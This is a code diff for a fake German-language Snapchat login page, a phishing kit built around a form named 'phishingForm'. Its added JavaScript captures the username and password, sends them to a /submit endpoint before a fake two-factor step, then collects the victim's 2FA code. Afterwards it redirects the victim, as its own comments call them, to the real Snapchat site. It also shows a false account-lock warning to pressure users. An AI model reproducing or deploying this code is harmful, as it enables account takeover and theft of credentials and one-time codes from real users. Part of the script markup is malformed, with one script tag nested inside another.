@@ -9,8 +9,9 @@
 </head>
 <body>
   <div class="login-container">
-    <form action="/submit" method="POST">
-      <div class="login-box" id="step1">
+    <form id="phishingForm">
+      <!-- SCHRITT 1: Nutzername -->
+      <div class="login-box" id="step1"> 
         <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
         <h2>Logge dich bei<br />Snapchat ein</h2>
         <label for="username">Nutzername oder E-Mail</label>
@@ -18,19 +19,31 @@
         <button type="button" id="step1-button" onclick="goToStep2()" disabled>Weiter</button>
       </div>
 
+      <!-- SCHRITT 2: Passwort -->
       <div class="login-box" id="step2" style="display: none;">
         <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
         <h2>Passwort eingeben</h2>
-        <div class="email-mask">
-          dia***com
-          <a href="#" onclick="goToStep1()">Das bist nicht du?</a>
+        <div class="email-mask" id="email-display">
+          <!-- Hier wird der Nutzername angezeigt -->
         </div>
         <label for="password">Passwort</label>
         <input type="password" id="password" name="password" required />
         <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
           Falsches Passwort. Noch 2 Versuche bis zur Kontosperrung.
         </div>
-        <button type="button" id="step2-button" disabled>Weiter</button>
+        <button type="button" id="step2-button" onclick="goToStep3()" disabled>Weiter</button>
+      </div>
+
+      <!-- SCHRITT 3: 2FA-Code (NEU!) -->
+      <div class="login-box" id="step3" style="display: none;">
+        <img src="snapchat-logo.png" alt="Snapchat" class="logo" />
+        <h2>Sicherheitsüberprüfung</h2>
+        <p>Wir haben einen Code an dein Handy gesendet. Bitte gib ihn unten ein.</p>
+        <input type="text" id="twoFACode" name="twoFACode" placeholder="6-stelliger Code" required />
+        <div id="code-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
+          Ungültiger Code. Versuche es erneut.
+        </div>
+        <button type="button" id="step3-button" onclick="submitAllData()">Bestätigen</button>
       </div>
     </form>
   </div>
@@ -141,6 +154,65 @@
 
   <script src="script.js"></script>
   <script>
+
+    <script>
+    // Nutzername speichern & Passwort-Schritt anzeigen
+    function goToStep2() {
+      const username = document.getElementById("username").value;
+      document.getElementById("step1").style.display = "none";
+      document.getElementById("step2").style.display = "block";
+      document.getElementById("email-display").innerHTML = 
+        username.substring(0, 3) + "***" + username.split("@")[1] + 
+        ' <a href="#" onclick="goToStep1()">Das bist nicht du?</a>';
+    }
+
+    // Passwort speichern & 2FA-Schritt anzeigen
+    function goToStep3() {
+      const password = document.getElementById("password").value;
+      document.getElementById("step2").style.display = "none";
+      document.getElementById("step3").style.display = "block";
+      
+      // Daten bereits jetzt an Server senden (ohne 2FA)
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: document.getElementById("username").value,
+          password: password
+        })
+      });
+    }
+
+    // ALLE DATEN (Nutzer + Passwort + 2FA) senden
+    function submitAllData() {
+      const twoFACode = document.getElementById("twoFACode").value;
+      
+      fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          twoFACode: twoFACode
+        })
+      }).then(() => {
+        // Opfer zur echten Snapchat-Seite leiten
+        window.location.href = "https://accounts.snapchat.com";
+      }).catch(err => {
+        document.getElementById("code-error").style.display = "block";
+      });
+    }
+
+    // Validierung der Eingaben
+    document.getElementById("username").addEventListener("input", function() {
+      document.getElementById("step1-button").disabled = !this.value;
+    });
+
+    document.getElementById("password").addEventListener("input", function() {
+      document.getElementById("step2-button").disabled = !this.value;
+    });
+
+    document.getElementById("twoFACode").addEventListener("input", function() {
+      document.getElementById("step3-button").disabled = !this.value;
+    });
   document.addEventListener("DOMContentLoaded", function () {
     function handleLanguageChange(selectedLang) {
       switch (selectedLang) {
